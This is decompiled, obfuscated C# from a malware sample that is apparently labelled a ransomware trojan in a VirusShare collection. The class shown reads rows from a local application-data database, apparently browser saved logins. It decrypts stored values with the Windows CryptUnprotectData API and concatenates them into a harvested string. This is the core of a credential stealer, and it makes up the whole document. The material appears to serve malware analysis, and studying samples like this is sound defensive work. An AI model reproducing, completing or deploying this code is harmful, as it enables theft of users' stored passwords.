// Decompiled with JetBrains decompiler
// Type: .
// Assembly: LLS, Version=2.24.9.7, Culture=neutral, PublicKeyToken=null
// MVID: 5D6D71DE-8D40-4460-ABF9-23365541871A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-eaa908bb12fef0827442be70b4421db585c6c2d8b0ee62f8245856740ea6a776.exe

using \u0003\u000E;
using \u000E;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;

namespace \u0003\u000E
{
  internal sealed class \u0010\u000E
  {
    private static string \u0001;
    private static string \u0002;
    public static string \u0003;
    public static string \u0004;

    static \u0010\u000E()
    {
      if (false)
        return;
      int num1 = 1664;
      int num2;
      while (true)
      {
        \u0010\u000E.\u0001 = \u0007\u000E.\u0006\u000E(\u0008.\u0007(num1), \u0008.\u0007(217));
        if (true)
        {
          num2 = 1761;
          if (num2 == 0)
            num1 = num2;
          else
            goto label_4;
        }
        else
          break;
      }
      return;
label_4:
      \u0010\u000E.\u0002 = \u0007\u000E.\u0006\u000E(\u0008.\u0007(num2), \u0008.\u0007(217));
    }

    public static void \u0083\u0002()
    {
      string str1 = \u000F.\u001E(global::\u000E.\u001D(Environment.SpecialFolder.LocalApplicationData), \u0007\u000E.\u0006\u000E(\u0008.\u0007(1858), \u0008.\u0007(217)));
      if (true)
        goto label_26;
label_1:
      string str2;
      try
      {
        \u0092\u0008 obj1 = new \u0092\u0008(str2);
        if (true)
          goto label_20;
label_2:
        \u0092\u0008 obj2;
        if (true)
          obj2.\u008F\u0008(\u0007\u000E.\u0006\u000E(\u0008.\u0007(1939), \u0008.\u0007(217)));
        else
          goto label_18;
label_4:
        if (!\u0084.\u0013\u0002(str2))
          return;
        int num1 = obj2.\u0090\u0008() - 1;
        if (true)
          goto label_21;
label_6:
        int num2;
        if (true)
        {
          num2 = 0;
          goto label_16;
        }
        else
          goto label_16;
label_21:
        int num3 = num1;
        goto label_6;
label_8:
        string str3 = obj2.\u0091\u0008(num2, \u0007\u000E.\u0006\u000E(\u0008.\u0007(1956), \u0008.\u0007(217)));
        string str4;
        if (true)
          str4 = str3;
label_9:
        string str5 = obj2.\u0091\u0008(num2, \u0007\u000E.\u0006\u000E(\u0008.\u0007(1981), \u0008.\u0007(217)));
        if (true)
          goto label_24;
label_10:
        string str6 = \u0010\u000E.\u0004(\u001F.\u007E\u009A((object) \u001D.\u0094(), obj2.\u0091\u0008(num2, \u0007\u000E.\u0006\u000E(\u0008.\u0007(2010), \u0008.\u0007(217)))));
        string str7;
        int num4 = \u0011.\u007F(str7, \u0008.\u0007(756), false) != 0 ? 1 : 0;
        int num5 = \u0011.\u007F(str6, \u0008.\u0007(756), false);
        int num6 = 0;
        if (num6 == 0)
        {
          int num7 = num5 == num6 ? 1 : 0;
          num6 = 0;
          num5 = num7;
        }
        int num8 = num5 == num6 ? 1 : 0;
        if ((num4 & num8) != 0)
        {
          string[] strArray = new string[10]
          {
            \u0010\u000E.\u0003,
            \u0007\u000E.\u0006\u000E(\u0008.\u0007(2039), \u0008.\u0007(217)),
            str4,
            \u0008.\u0007(848),
            \u0007\u000E.\u0006\u000E(\u0008.\u0007(2056), \u0008.\u0007(217)),
            str7,
            \u0008.\u0007(848),
            \u0007\u000E.\u0006\u000E(\u0008.\u0007(2081), \u0008.\u0007(217)),
            str6,
            \u0008.\u0007(822)
          };
          \u0010\u000E.\u0003 = \u0012.\u0080(strArray);
        }
        if (true)
        {
          ++num2;
          goto label_16;
        }
        else
          goto label_8;
label_24:
        str7 = str5;
        goto label_10;
label_16:
        if (true)
        {
          if (num2 <= num3)
            goto label_8;
        }
        else
          goto label_4;
label_18:
        if (true)
        {
          string[] strArray = new string[5]
          {
            \u0010\u000E.\u0001,
            \u0008.\u0007(822),
            \u0010\u000E.\u0003,
            \u0008.\u0007(848),
            \u0010\u000E.\u0002
          };
          \u0010\u000E.\u0004 = \u0012.\u0080(strArray);
          return;
        }
        goto label_9;
label_20:
        obj2 = obj1;
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0014.\u0082();
        return;
      }
label_26:
      str2 = str1;
      goto label_1;
    }

    [DllImport("Crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool \u0006\u0003(
      [In] ref \u0010\u000E.\u0016\u0003 obj0,
      [In] string obj1,
      [In] ref \u0010\u000E.\u0016\u0003 obj2,
      [In] IntPtr obj3,
      [In] ref \u0010\u000E.\u0094\u0008 obj4,
      [In] int obj5,
      [In] ref \u0010\u000E.\u0016\u0003 obj6);

    public static string \u0004([In] byte[] obj0)
    {
      \u0010\u000E.\u0016\u0003 obj1;
      if (true)
      {
        \u0010\u000E.\u0016\u0003 obj2 = new \u0010\u000E.\u0016\u0003();
        obj1 = new \u0010\u000E.\u0016\u0003();
        GCHandle gcHandle1 = \u0088.\u0018\u0002((object) obj0, GCHandleType.Pinned);
        if (true)
          goto label_9;
label_2:
        GCHandle gcHandle2;
        obj2.\u0002 = gcHandle2.AddrOfPinnedObject();
        obj2.\u0001 = obj0.Length;
        ref GCHandle local1 = ref gcHandle2;
        if (true)
          goto label_10;
label_3:
        ref \u0010\u000E.\u0016\u0003 local2 = ref obj2;
        \u0010\u000E.\u0016\u0003 obj3;
        \u0010\u000E.\u0016\u0003 obj4 = obj3;
        if (true)
          goto label_11;
label_4:
        \u0010\u000E.\u0016\u0003 obj5;
        ref \u0010\u000E.\u0016\u0003 local3 = ref obj5;
        IntPtr num1;
        IntPtr num2 = num1;
        \u0010\u000E.\u0094\u0008 obj6;
        \u0010\u000E.\u0094\u0008 obj7 = obj6;
        if (true)
          goto label_12;
label_5:
        \u0010\u000E.\u0094\u0008 obj8;
        ref \u0010\u000E.\u0094\u0008 local4 = ref obj8;
        ref \u0010\u000E.\u0016\u0003 local5 = ref obj1;
        \u0010\u000E.\u0006\u0003(ref local2, (string) null, ref local3, num2, ref local4, 0, ref local5);
        goto label_6;
label_12:
        obj8 = obj7;
        goto label_5;
label_11:
        obj5 = obj4;
        goto label_4;
label_10:
        local1.Free();
        goto label_3;
label_9:
        gcHandle2 = gcHandle1;
        goto label_2;
      }
label_6:
      byte[] numArray1 = new byte[obj1.\u0001 + 1];
      if (true)
        goto label_13;
label_7:
      \u0089 obj9 = \u0089.\u0019\u0002;
      IntPtr num3 = obj1.\u0002;
      byte[] numArray2;
      byte[] numArray3 = numArray2;
      int num4 = obj1.\u0001;
      if (true)
        goto label_14;
label_8:
      string str = \u007F.\u007E\u009B((object) \u001D.\u0094(), numArray2);
      return \u008A.\u007E\u001A\u0002((object) str, 0, \u0007.\u007E\u000E((object) str) - 1);
label_14:
      obj9(num3, numArray3, 0, num4);
      goto label_8;
label_13:
      numArray2 = numArray1;
      goto label_7;
    }

    [Flags]
    public enum \u0093\u0008
    {
      \u0001 = 1,
      \u0002 = 2,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct \u0094\u0008
    {
      public int \u0001;
      public \u0010\u000E.\u0093\u0008 \u0002;
      public IntPtr \u0003;
      public string \u0004;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct \u0016\u0003
    {
      public int \u0001;
      public IntPtr \u0002;
    }
  }
}
